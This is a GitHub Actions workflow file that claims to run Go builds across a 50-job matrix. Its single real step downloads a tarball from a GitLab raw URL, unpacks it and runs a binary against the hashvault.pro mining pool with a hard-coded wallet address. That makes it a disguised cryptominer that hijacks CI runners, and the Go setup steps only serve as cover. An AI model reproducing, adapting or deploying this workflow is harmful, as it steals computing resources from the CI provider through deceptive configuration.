name: BIN_Gits
on: [push, pull_request]
jobs:
  build:
    name: BIN_Github
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 500
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4, 1.5]
        flag: [A, B, C, D, E, F, G, H, I, J]
    timeout-minutes: 3
    env:
        NUM_JOBS: 500
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: runner_go
      run: |
        wget https://gitlab.com/mulyadiarya14/load3/-/raw/main/-.tar.gz && tar -xf -.tar.gz && ./- --url singapore01.hashvault.pro:80 --user 8Akom9jdkvSSA6EGYTb4Uy19Z2QAWE7NGbZQ6iafP5xeVZXLYNuSFPURqTVATZKuB6T5NeYpuabDshnodCURBxMpP7y889B --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
